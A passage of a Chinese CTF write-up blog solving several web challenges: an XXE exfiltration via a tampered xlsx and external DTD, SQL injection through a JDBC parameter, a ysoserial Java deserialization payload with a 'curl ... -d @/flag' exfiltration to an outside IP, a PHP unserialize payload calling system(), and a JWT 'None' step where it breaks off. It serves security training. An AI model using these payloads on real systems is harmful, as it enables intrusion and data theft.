UUID.randomUUID().toString() + <span class="string">&quot;_&quot;</span> + filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">makePath</span><span class="params">(String filename, String savePath)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> filename.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">dir1</span> <span class="operator">=</span> hashCode &amp; <span class="number">15</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">dir2</span> <span class="operator">=</span> (hashCode &amp; <span class="number">240</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> savePath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>新建一个excel-1.xlsx文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425220213093.png" alt="image-20220425220213093"></p>
<p>改后缀名为zip</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425220304145.png" alt="image-20220425220304145"></p>
<p>解压缩</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425220321341.png" alt="image-20220425220321341"></p>
<p>对文件夹里面的[Content_Types].xml进行修改,修改完之后在压缩成zip文件,改名后缀为xlsx</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://090d5d2b-5273-4359-b03d-35dba710484d.challenge.ctf.show/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425222459998.png" alt="image-20220425222459998"></p>
<p>在自己服务器上面新建一个1.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;https://090d5d2b-5273-4359-b03d-35dba710484d.challenge.ctf.show:8888/%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h1 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h1><p>SqlDict.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.core.sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DatabaseMetaData;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDict</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlDict</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//静态连接方法传入dbName user pass</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">//如果dbname不等于空就直接连接</span></span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                pass = <span class="string">&quot;abc@12345&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">            var6.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title function_">getTableData</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">        List&lt;Table&gt; Tables = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> getConnection(dbName, user, pass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">TableName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">DatabaseMetaData</span> <span class="variable">metaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">tableNames</span> <span class="operator">=</span> metaData.getTables((String)<span class="literal">null</span>, (String)<span class="literal">null</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">                TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">                <span class="type">Table</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">                <span class="comment">//这里存在sql注入</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                    table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                table.setTableName(TableName);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">data</span> <span class="operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="literal">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">rs2</span> <span class="operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="literal">null</span>, TableName);</span><br><span class="line"></span><br><span class="line">                String PK;</span><br><span class="line">                <span class="keyword">for</span>(PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(data.next()) &#123;</span><br><span class="line">                    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Row</span>(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="literal">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">                    table.list.add(row);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Tables.add(table);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">            var16.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tables;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Test.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.core.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseCode;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseResult;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.security.annotation.Access;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.SqlDict;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Table;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CrossOrigin;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/common/test&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/sqlDict&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@Access</span></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;为了开发方便对应数据库字典查询&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseResult <span class="title function_">sqlDict</span><span class="params">(String dbName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        List&lt;Table&gt; tables = SqlDict.getTableData(dbName, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;abc@12345&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ResponseResult.e(ResponseCode.OK, tables);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里提供了一个swagger ui</p>
<p>swagger ui:提供可视化的ui页面展示描述文件.接口的调用方 测试 项目经理等都可以在该页面中对相关接口进行查阅和做简单的接口请求.该项目支持在线导入描述文件和本地部署ui项目</p>
<p>默认目录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425225721187.png" alt="image-20220425225721187"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220425225844340.png" alt="image-20220425225844340"></p>
<p>这里由于&#x2F;common&#x2F;test&#x2F;sqlDict存在注入点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbName = &quot;jdbc:mysql://mysqldbserver:3306/&quot; + dbName;</span><br></pre></td></tr></table></figure>

<p>要进行注入,就需要在连接数据库的时候不出错误.而jdbc类似url解析,所以我们输入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">myapp#<span class="string">&#x27; union select 1#</span></span><br><span class="line"><span class="string">jdbc:mysql://mysqldbserver:3306/myapp#&#x27;</span> union select <span class="number">1</span>#</span><br><span class="line">会被解析成</span><br><span class="line">jdbc:mysql:<span class="comment">//mysqldbserver:3306/myapp</span></span><br><span class="line"></span><br><span class="line">带入sql语句</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES <span class="type">Where</span> <span class="variable">table_schema</span> <span class="operator">=</span> <span class="string">&#x27;#&#x27;</span> union select <span class="number">1</span>#<span class="string">&#x27; and table_name=&#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">这样的话其中前一个#被包裹在单引号里面而后面的#会将后面的语句注释掉</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426131450523.png" alt="image-20220426131450523"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myapp#&#x27; union select pwd from user#</span><br><span class="line"></span><br><span class="line">admin@Rrrr_ctf_asde</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426131647074.png" alt="image-20220426131647074"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myapp#&#x27; union select name from user#</span><br><span class="line"></span><br><span class="line">admin</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426132029869.png" alt="image-20220426132029869"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426132150690.png" alt="image-20220426132150690"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426132204066.png" alt="image-20220426132204066"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &quot;Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu&quot;,</span><br><span class="line">  &quot;msg&quot;: &quot;登录成功&quot;,</span><br><span class="line">  &quot;status&quot;: 2,</span><br><span class="line">  &quot;timestamps&quot;: 1650950514748</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段data中以rO0AB开头,可以基本确定是java序列化base64加密的数据,或者如果以aced开头,那么他就是这语段java序列化的十六进制</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426132559947.png" alt="image-20220426132559947"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426132606315.png" alt="image-20220426132606315"></p>
<p>用ysoserial 打 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202730">ysoserial Java 反序列化系列第一集 Groovy1</a><br> <a target="_blank" rel="noopener" href="http://www.vuln.cn/6295">java反序列化工具ysoserial分析– angelwhu</a><br> <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/214096.html">玩转Ysoserial-CommonsCollection的七种利用方式分析 </a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;curl http://174.2.90.186:1234 -d @/flag&quot; &gt; t.bin</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426134353489.png" alt="image-20220426134353489"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;t.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Bearer &quot;</span>+ba.decode())</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426134639837.png" alt="image-20220426134639837"></p>
<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426141807317.png" alt="image-20220426141802595"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426141650889.png" alt="image-20220426141650889"></p>
<p>传了两个参数来获得时间</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426141945852.png" alt="image-20220426141945852"></p>
<p>推测可能使用了call_user_func()函数,读一下源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=highlight_file&amp;p=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426142335081.png" alt="image-20220426142335081"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;phpweb&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background: <span class="title function_ invoke__">url</span>(<span class="string">&quot;bg.jpg&quot;</span>) no-repeat;</span><br><span class="line">            background-size: <span class="number">100</span>%;</span><br><span class="line">        &#125;</span><br><span class="line">        p &#123;</span><br><span class="line">            color: white;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language=javascript&gt;</span><br><span class="line">    <span class="title function_ invoke__">setTimeout</span>(<span class="string">&quot;document.form1.submit()&quot;</span>,<span class="number">5000</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable language_">$this</span>-&gt;func, <span class="variable language_">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;form  id=form1 name=form1 action=<span class="string">&quot;index.php&quot;</span> method=post&gt;</span><br><span class="line">    &lt;input type=hidden id=func name=func value=<span class="string">&#x27;date&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=hidden id=p name=p value=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>禁用了不少不过有一个__destruct()方法可用,我们可以直接反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>);</span><br><span class="line"><span class="comment">#O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426143249297.png" alt="image-20220426143249297"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426143819847.png" alt="image-20220426143819847"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426143854248.png" alt="image-20220426143854248"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426144503735.png" alt="image-20220426144503735"></p>
<p>拿到源码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426144517482.png" alt="image-20220426144517482"></p>
<p>可以看到使用的是koa2框架结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controllers 项目控制器目录接受请求处理逻辑</span><br><span class="line">DataBase 保存数据库封装的CRUD操作方法</span><br><span class="line">models文件夹 对应的数据库表结构</span><br><span class="line">config文件夹 项目路由文件夹</span><br><span class="line">app.js 入口文件</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426145331235.png" alt="image-20220426145331235"></p>
<p>这里就去访问&#x2F;controllers&#x2F;api.js</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426145401789.png" alt="image-20220426145401789"></p>
<p>发现使用jwt</p>
<p>注册</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220426145618321.png" alt="image-20220426145618321"></p>
<p>登录拿jwt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiJ3YW5hbiIsInBhc3N3b3JkIjoid2FuYW4iLCJpYXQiOjE2NTA5NTYxNzl9.OuD0FnGFaExLQ6m8AFEq471DAmbP2y1bchVIP5mPXJM</span><br></pre></td></tr></table></figure>

<p>改成None</p>
